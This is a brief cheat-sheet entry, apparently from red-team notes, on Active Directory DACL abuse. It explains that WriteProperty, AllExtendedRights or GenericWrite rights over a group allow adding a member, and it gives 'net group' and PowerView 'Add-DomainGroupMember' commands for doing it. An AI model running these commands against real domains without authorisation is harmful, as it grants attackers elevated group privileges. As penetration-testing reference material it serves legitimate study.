# DACL Attacks on a group

## 1) WriteProperty/AllExtendedRights/GenericWrite Self

With one of these rights we can add a new member to the group

    net group <target_group> user1 /add

##### With PowerView

    Add-DomainGroupMember -Identity '<target_group>' -Members 'user1'
